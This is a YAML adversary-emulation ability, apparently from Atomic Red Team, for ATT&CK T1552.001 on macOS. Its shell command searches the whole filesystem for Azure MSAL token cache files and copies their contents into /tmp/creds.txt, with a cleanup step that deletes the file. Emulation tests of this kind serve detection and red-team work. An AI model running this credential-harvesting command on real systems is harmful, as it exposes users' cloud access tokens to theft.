- id: a8f6148d-478a-4f43-bc62-5efee9f931a4
  name: Find Azure credentials
  description: Find local Azure credentials from file, defaults to using / as the
    look path.
  tactic: credential-access
  technique:
    attack_id: T1552.001
    name: 'Unsecured Credentials: Credentials In Files'
  platforms:
    darwin:
      sh:
        command: find / -path '*/.azure/msal_token_cache.json' -type f -exec sh -c
          'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt' _ {} \;
          2>/dev/null
        cleanup: rm -f /tmp/creds.txt
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - atomic-red-team
  - t1552.001
  - credential-access
  author: Atomic Red Team
  additional_info:
    input_arguments:
      file_path:
        description: Path to search
        type: string
        default: /
      filename:
        description: Credential file to search for
        type: string
        default: msal_token_cache.json
      optional_flags:
        description: optional flags passed into find that should be ran
        type: string
        default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
          _ {} \;
    technique_created: '2020-02-04T12:52:13.006Z'
    atomic_guid: a8f6148d-478a-4f43-bc62-5efee9f931a4
    import_timestamp: '2026-09-05T06:40:49.878996Z'
